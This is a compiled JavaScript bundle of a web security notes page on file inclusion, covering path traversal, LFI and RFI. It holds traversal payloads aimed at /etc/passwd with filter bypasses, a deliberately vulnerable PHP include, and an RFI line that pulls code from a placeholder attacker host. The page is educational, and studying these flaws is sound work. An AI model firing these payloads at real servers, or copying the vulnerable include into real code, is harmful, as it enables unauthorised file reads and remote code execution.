"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[7307],{19140:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>a,contentTitle:()=>r,default:()=>u,frontMatter:()=>c,metadata:()=>l,toc:()=>o});var s=i(74848),t=i(28453);const c={},r="\ud83d\udcc1 File inclusion",l={id:"security/web/file-inclusion",title:"\ud83d\udcc1 File inclusion",description:"A file inclusion vulnerability is caused when a malicious user can access or upload unathorized files or directories.",source:"@site/docs/security/05-web/file-inclusion.md",sourceDirName:"security/05-web",slug:"/security/web/file-inclusion",permalink:"/docs/security/web/file-inclusion",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/security/05-web/file-inclusion.md",tags:[],version:"current",frontMatter:{},sidebar:"securitySidebar",previous:{title:"\ud83d\udd24 Enumeration",permalink:"/docs/security/web/enumeration"},next:{title:"\ud83d\udd87\ufe0f IDOR",permalink:"/docs/security/web/idor"}},a={},o=[{value:"Path traversal",id:"path-traversal",level:2},{value:"LFI",id:"lfi",level:2},{value:"RFI",id:"rfi",level:2}];function d(e){const n={code:"code",h1:"h1",h2:"h2",li:"li",p:"p",pre:"pre",ul:"ul",...(0,t.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"-file-inclusion",children:"\ud83d\udcc1 File inclusion"}),"\n",(0,s.jsx)(n.p,{children:"A file inclusion vulnerability is caused when a malicious user can access or upload unathorized files or directories."}),"\n",(0,s.jsx)(n.p,{children:"There are three main types of file inclusion vulnerabilities:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Path traversal"}),"\n",(0,s.jsx)(n.li,{children:"Local File Intrusion (LFI)"}),"\n",(0,s.jsx)(n.li,{children:"Remote File Inclusion (RFI)"}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"path-traversal",children:"Path traversal"}),"\n",(0,s.jsx)(n.p,{children:"The attacker can access files in other directories of the server.\nUsually, this type of attack is based on dot-dot-slash notation."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# basic dot-dot-slash notation\n../../../etc/passwd\n\n# ascii version\n%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd\n\n# truncate string (PHP < 5.3.4) using null byte\n# useful when something is appended like \".php\"\n../../../etc/passwd0x00\n../../../etc/passwd%00\n../../../etc/passwd\\0\n\n# if validation is done over the first match of the string 'etc' and what is right after\n../../../etc/../etc/passwd\n\n# if '/etc/passwd' is filtered\n../../../etc/./passwd\n\n# if '../' is removed\n....//....//....//....//....//etc/passwd\n"})}),"\n",(0,s.jsx)(n.h2,{id:"lfi",children:"LFI"}),"\n",(0,s.jsx)(n.p,{children:"In Local File Intrusion (LFI) the attacker makes the server to include other local script files."}),"\n",(0,s.jsx)(n.p,{children:"The main difference with path traversal is the execution of scripts decided by the attacker."}),"\n",(0,s.jsxs)(n.p,{children:["In PHP this could happen with functions like ",(0,s.jsx)(n.code,{children:"include"}),", ",(0,s.jsx)(n.code,{children:"required"}),", ",(0,s.jsx)(n.code,{children:"include_once"}),", and ",(0,s.jsx)(n.code,{children:"required_once"}),"."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:'<?php\n  include("./pages/".$_GET["page"]);\n?>\n'})}),"\n",(0,s.jsx)(n.h2,{id:"rfi",children:"RFI"}),"\n",(0,s.jsx)(n.p,{children:"In Remote File Inclusion (RFI) the attacker makes the server to include other script files from external sources."}),"\n",(0,s.jsxs)(n.p,{children:["For example, the function ",(0,s.jsx)(n.code,{children:"include"})," can also import external sources:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:'<?php\n  include("http://attacker.com/inject.php");\n?>\n'})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",metastring:'title="inject.php"',children:'<?php\n  print(exec("hostname"));\n?>\n'})})]})}function u(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},28453:(e,n,i)=>{i.d(n,{R:()=>r,x:()=>l});var s=i(96540);const t={},c=s.createContext(t);function r(e){const n=s.useContext(c);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:r(e.components),s.createElement(c.Provider,{value:n},e.children)}}}]);